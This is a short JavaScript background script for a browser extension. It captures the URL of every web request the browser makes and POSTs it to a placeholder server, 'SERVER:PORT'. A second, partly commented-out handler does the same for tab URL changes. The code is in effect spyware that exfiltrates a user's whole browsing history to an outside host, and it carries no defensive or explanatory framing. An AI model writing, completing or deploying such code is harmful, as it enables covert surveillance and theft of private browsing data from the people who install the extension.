function sendData(data){
	var xhttp = new XMLHttpRequest();
	// Needs second argument - location to send data 
	// XMLHttpRequest cannot be used cross-domain
	xhttp.open('POST', 'SERVER:PORT', true);
	xhttp.send(data);
}

function logURL(requestDetails) {
	sendData(requestDetails.url)
  console.log("Loading: " + requestDetails.url);
}

browser.webRequest.onBeforeRequest.addListener(
  logURL,
  {urls: ["<all_urls>"]}
);

function handleUpdated(tabId, changeInfo, tabInfo) {
  if (changeInfo.url) { 
 
	//sendData(changeInfo.url); 
	
    console.log("Data has been sent!");
  }

}

browser.tabs.onUpdated.addListener(handleUpdated);
  


